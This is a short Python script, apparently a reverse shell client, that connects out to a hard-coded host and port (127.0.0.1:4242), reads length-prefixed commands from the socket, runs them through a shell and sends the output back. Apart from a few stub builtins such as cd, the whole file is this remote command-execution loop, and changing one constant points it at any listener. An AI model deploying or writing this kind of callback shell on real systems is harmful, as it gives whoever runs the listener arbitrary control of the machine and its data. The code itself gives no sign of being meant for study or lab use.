#!/usr/bin/env python3

from sys import argv as argv
import socket
import subprocess
import struct
import os, signal


URL = "127.0.0.1"
port = 4242


def send_msg(sock, msg):
    if type(msg) is str:
        msg = bytes(msg, 'utf-8')
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)


def recv_msg(sock):
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recvall(sock, msglen)


def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data


def not_implemented(c, cmd):
  print ("Not implemented yet")


def cd(c, cmd):
  cmd.pop(0)
  data = " ".join(cmd)
  os.chdir(data)
  print(os.getcwd())
  print("fct cd " + data)  
  

builtins = {
  'cd': cd,
  'env': not_implemented,
  'setenv': not_implemented,
  'unsetenv': not_implemented
}


def builtin(c, cmd):
  builtins[cmd[0]](c, cmd)
  send_msg(c, b'Builtin')
  return False


def shell(c, cmd):
  data = " ".join(cmd)
  proc = subprocess.Popen(data,
                          shell=True,
                          stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE,
                          stdin=subprocess.PIPE,
                          preexec_fn=os.setsid)
  stdout_value = proc.stdout.read() + proc.stderr.read()
  os.killpg(proc.pid, signal.SIGTERM)
  if data[:-1] != "&" :
    if stdout_value:
      send_msg(c, stdout_value)
    else:
      send_msg(c, b'Command executed without stdout value')
  return False


def cmd(c):
  data = recv_msg(c).decode("utf-8")
  if data == "quit" or len(data) == 0:
    return True
  else:
    cmd = data.split(' ')
    if cmd[0] in builtins:
      return builtin(c, cmd)
    else:
      return shell(c, cmd)


def main(av):
    socket_died = False
    while not socket_died :
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((URL,port))
        while not socket_died:
            socket_died = cmd(client)
    client.close()
    return 0


if __name__ == "__main__":
    exit(main(argv))
